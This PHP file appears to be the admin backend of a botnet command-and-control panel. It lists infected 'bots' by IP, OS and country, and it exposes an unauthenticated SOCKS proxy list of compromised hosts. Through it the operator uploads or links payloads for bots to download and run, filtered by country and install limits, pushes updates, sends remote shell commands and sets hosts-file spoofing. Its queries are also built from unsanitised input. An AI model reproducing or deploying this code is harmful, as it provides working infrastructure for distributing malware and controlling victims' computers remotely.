<?php
	
require("./inc/cfg.php");
require("./inc/funcs.php");

$referrer = $_SERVER['HTTP_REFERER'];

$dbase = new dbClass();

if (isset($_GET["opt"])) {
	if ($_GET["opt"] == "socks") {
	$time = time();
	$time = $time-$config['interval']-120;
	$r = mysql_query("SELECT * FROM socks WHERE time>$time ORDER BY time DESC");
	$out='';
	while($v = mysql_fetch_assoc($r))
	{
		$out.=$v['ip'].':'.$v['port']."\n";
	}
	echo $out;
	exit;
	}
}

if(!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER'] !== $config["admin"] || $_SERVER['PHP_AUTH_PW'] !== $config["pass"])
{
	header('WWW-Authenticate: Basic realm="Who are you?"');
	header('HTTP/1.0 401 Unauthorized');
	exit;
}

if ($_POST['mode']=='search') {
	mysql_query("UPDATE `options` SET `search`=''");
	$id_pattern = $_POST['sr_pattern'];
	$geo_pattern = $_POST['sr_geo'];
	$sel_pattern = $_POST['sr_seller'];
	$ip_pattern = $_POST['sr_ip'];
	$r = mysql_query("SELECT * FROM bots ORDER BY time DESC");
	$out='';
	while($v = mysql_fetch_assoc($r))
	{
		if ((stripos($v['cname'],$id_pattern)!==false) || (stripos($v['country'],$geo_pattern)===0) || (stripos($v['seller'],$sel_pattern)!==false) || (stripos($v['ip'],$ip_pattern)!==false)) {
		$bits = $v['bits'];
		if ($bits==0) {$bits='x86';} else {$bits='x64';}
		$out.='<tr><td align="center" style="width:250px;">'.$v['cname'].'</td><td align="center" style="width:150px;">'.$v['ip'];
		$out.= '</td><td align="center" style="width:100px;"><img src="./imgs/os/'.$v['os'].'.png" align="middle"/> - '.$bits.'</td><td align="center" style="width:250px;">'.date('d.m.Y H:i:s',$v['time']).'</td><td align="center" style="width:150px;"><img src="./imgs/flags/'.strtolower($v['country']).'.gif" hspace="5">'.$v['country'].'</td><td align="center" style="width:50px;">'.$v['seller'].'</td><td align="center" style="width:100px;"><a href="#" onclick="showdiv(\'personal\','.$v['id'].'); return false">Set</a></td></tr>';
		}
	}
	$out = base64_encode($out);
	mysql_query("UPDATE `options` SET `search`='$out'");
	echo'<meta http-equiv=REFRESH CONTENT="0;URL=control.php?page=bots&mode=search">';
	exit;
}

if (isset($_GET["opt"])) {
	if ($_GET["opt"] == "delexe") {
	$v=mysql_query("SELECT * FROM sellers");
		while($r=mysql_fetch_assoc($v)){
		@unlink('./exe/'.$r['id'].'.tmp');
		}
	mysql_query("TRUNCATE TABLE sellers");	
	} elseif($_GET["opt"] == "delpers") {
	$v=mysql_query("SELECT * FROM personal");
		while($r=mysql_fetch_assoc($v)){
		@unlink('./exe/p'.$r['botid'].'.tmp');
		}
	mysql_query("TRUNCATE TABLE personal");
	mysql_query("UPDATE bots SET personal=0");
	} elseif ($_GET["opt"] == "delstat") {
	mysql_query("TRUNCATE TABLE bots");
	mysql_query("UPDATE sellers SET loads=0");
	mysql_query("UPDATE sellers SET runs=0");	
	} elseif ($_GET["opt"] == "deldoub") {
	mysql_query("UPDATE bots SET doub=0");
	} elseif ($_GET["opt"] == "delupdate") {
	mysql_query("TRUNCATE TABLE `update`");
	mysql_query("UPDATE bots SET upd=0");
	@unlink('./exe/update.exe');
	} elseif ($_GET["opt"] == "delsocks") {
	mysql_query("TRUNCATE TABLE socks");
	} else	{
	header('Location: '.$referrer);
	exit;	
	}
}

if ($_POST["edit"] == "yes") {
$id = $_POST["id"];
$geo = $_POST["geo"];
$geo = strtolower($geo);
$limit = $_POST["limit"];
$seller = $_POST["seller"];
$isdll = $_POST["start"];
	if (empty($geo)) $geo='all';
	if (!empty($_FILES['file']['name'])) {
	mysql_query("UPDATE sellers SET `time`=".time().",`from`='0',`seller`='$seller',`limit`='$limit',`country`='$geo',`isdll`='$isdll' WHERE id='".$id."'");
	@unlink('./exe/'.$id.'.tmp');
	move_uploaded_file($_FILES['file']['tmp_name'], './exe/'.$id.'.tmp');
	echo'<meta http-equiv=REFRESH CONTENT="0;URL=control.php?page=exe">';
	exit;
	} else {
	header('Location: '.$referrer);
	exit;	
	}
} elseif ($_POST["edit"] == "remote") {
$id = $_POST["id"];
$from = $_POST["url"];
$geo = $_POST["geo"];
$geo = strtolower($geo);
$limit = $_POST["limit"];
$seller = $_POST["seller"];
$isdll = $_POST["start"];
	if (empty($geo)) $geo='all';
	if (!empty($from)) {
	mysql_query("UPDATE sellers SET `time`=".time().",`from`='$from',`seller`='$seller',`limit`='$limit',`country`='$geo',`isdll`='$isdll' WHERE id='".$id."'");
	echo'<meta http-equiv=REFRESH CONTENT="0;URL=control.php?page=exe">';
	exit;
	} else {
	header('Location: '.$referrer);
	exit;	
	}
}

if (!empty($_FILES['updname']['name'])) {
	mysql_query("UPDATE bots SET upd=1");
	mysql_query("TRUNCATE TABLE `update`");
	@unlink('./exe/update.exe');	
	mysql_query("INSERT INTO `update` (`from`) VALUES ('local');");
	move_uploaded_file($_FILES['updname']['tmp_name'], './exe/update.exe');
	header('Location: '.$referrer);
	exit;
} elseif (!empty($_POST["update"])) {
	$url = $_POST["update"];
	mysql_query("UPDATE bots SET upd=1");
	mysql_query("TRUNCATE TABLE `update`");
	mysql_query("INSERT INTO `update` (`from`) VALUES ('".$url."');");
	header('Location: '.$referrer);
	exit;
} elseif (!empty($_POST["iplist"])) {
	$iplist = $_POST["iplist"];
	mysql_query("UPDATE socksip SET valid='".$iplist."'");
	header('Location: '.$referrer);
	exit;
} elseif (!empty($_POST["hosts"])) {
	$hosts = $_POST["hosts"];
		if (strlen($hosts)>7) {
		mysql_query("UPDATE socksip SET hosts='".$hosts."'");
		mysql_query("UPDATE bots SET spoofed=0");
		}
	header('Location: '.$referrer);
	exit;
} elseif (!empty($_POST["reserve"])) {
	$reserve = $_POST["reserve"];
		if ((strlen($reserve)>7) || ($reserve == 'none')) {
		mysql_query("UPDATE options SET reserv='".$reserve."'");
		}
	header('Location: '.$referrer);
	exit;
} elseif (isset($_POST["shell_cmd"])) {
	$shell = $_POST["shell_cmd"];
	mysql_query("UPDATE socksip SET shell='".$shell."'");
	mysql_query("UPDATE bots SET shell=0");
	header('Location: '.$referrer);
	exit;
}

if (!empty($_FILES['file']['name']) && !empty($_POST['botid'])) {
$botid = $_POST["botid"];
$task = "local";
$isdll = $_POST["start"];
	mysql_query("UPDATE bots SET personal=1 WHERE `id`=$botid");
	mysql_query("INSERT INTO `personal` (`botid`, `task`, `isdll`) VALUES ('".$botid."', '".$task."', '".$isdll."') ON DUPLICATE KEY UPDATE `task`='$task',`isdll`='$isdll';");
	@unlink('./exe/p'.$botid.'.tmp');
	move_uploaded_file($_FILES['file']['tmp_name'], './exe/p'.$botid.'.tmp');
	header('Location: '.$referrer);
	exit;
}elseif (!empty($_POST["url"]) && !empty($_POST['botid'])) {
$botid = $_POST["botid"];
$task = $_POST["url"];
$isdll = $_POST["start"];
	mysql_query("UPDATE bots SET personal=1 WHERE `id`=$botid");
	mysql_query("INSERT INTO `personal` (`botid`, `task`, `isdll`) VALUES ('".$botid."', '".$task."', '".$isdll."') ON DUPLICATE KEY UPDATE `task`='$task',`isdll`='$isdll';");
	header('Location: '.$referrer);
	exit;
}

if (!empty($_FILES['file']['name']) && empty($_POST['botid'])) {
$comment = $_POST["comment"];
$geo = $_POST["geo"];
$geo = strtolower($geo);
$limit = $_POST["limit"];
$seller = $_POST["seller"];
$isdll = $_POST["start"];
	if (empty($geo)) $geo='all';
	mysql_query("UPDATE bots SET work=1");
	$v=mysql_query("SELECT MAX(id) as max FROM sellers");
	$max=mysql_fetch_assoc($v);
	mysql_query("INSERT INTO `sellers` (`id`, `seller`, `comment`, `loads`, `runs`, `limit`, `country`, `time`, `isdll`) VALUES ('', '".$seller."', '".$comment."', '0', '0', '".$limit."', '".$geo."', 	'".time()."', '".$isdll."');");
	$id=mysql_insert_id();
	move_uploaded_file($_FILES['file']['tmp_name'], './exe/'.$id.'.tmp');
	header('Location: '.$referrer);
	exit;
} elseif (!empty($_POST["url"]) && empty($_POST['botid'])) {
$comment = $_POST["comment"];
$from = $_POST["url"];
$geo = $_POST["geo"];
$geo = strtolower($geo);
$limit = $_POST["limit"];
$seller = $_POST["seller"];
$isdll = $_POST["start"];
	if (empty($geo)) $geo='all';
	mysql_query("UPDATE bots SET work=1");
	$v=mysql_query("SELECT MAX(id) as max FROM sellers");
	$max=mysql_fetch_assoc($v);
	mysql_query("INSERT INTO `sellers` (`id`, `seller`, `comment`, `from`, `loads`, `runs`, `limit`, `country`, `time`, `isdll`) VALUES ('', '".$seller."', '".$comment."', '".$from."', '0', '0', '".$limit."', '".$geo."', 	'".time()."', '".$isdll."');") or die(mysql_error());
	header('Location: '.$referrer);
	exit;
} else {header('Location: '.$referrer);exit;}

?>